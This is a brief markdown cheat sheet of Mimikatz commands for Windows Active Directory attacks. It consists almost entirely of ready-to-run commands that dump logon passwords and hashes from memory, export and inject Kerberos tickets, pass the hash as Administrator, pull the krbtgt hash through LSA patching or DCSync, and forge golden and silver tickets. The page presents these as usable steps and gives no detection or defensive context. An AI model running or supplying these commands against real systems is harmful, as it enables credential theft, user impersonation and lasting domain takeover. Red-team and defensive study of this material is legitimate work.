# Mimikatz

<https://github.com/gentilkiwi/mimikatz>

## Dump hashes

```cmd
sekurlsa::logonpasswords
```

## Dump tickets

```cmd
sekurlsa::tickets
sekurlsa::tickets /export
```

## Inject ticket into current session

```cmd
kerberos::ptt C:\Path\to\ticket.kirbi
```

## Run command as user

```cmd
sekurlsa::pth /user:Administrator /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
```

## Golden Ticket

Execute on the DC to get krbtgt hash
```cmd
lsadump::lsa /patch
```

On any machine  
```cmd
kerberos::golden /User:Administrator /domain:current.domain.local /sid:<domain sid> /krbtgt:<krbtgt hash> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```
Use `/ticket` instead of `/ptt` to save the ticket to a file rather than injecting it into the session  

Use DCSync with DA privileges to get kbrtgt hash  
```cmd
lsadump::dcsync /user:<domain>\krbtgt
```

## Silver Ticket

Get service hash and impersonate any user for that service  
On the DC:  
```cmd
lsadump::lsa /patch
```
Using the hash of the DC computer account  
```cmd
kerberos::golden /domain:current.domain.local /sid:<domain sid> /target:target-dc.current.domain.local /service:HOST /rc4:<rc4 string> /user:Administrator /startoffset:0 /endin:600 /renewmax:10080 /ptt
```
```
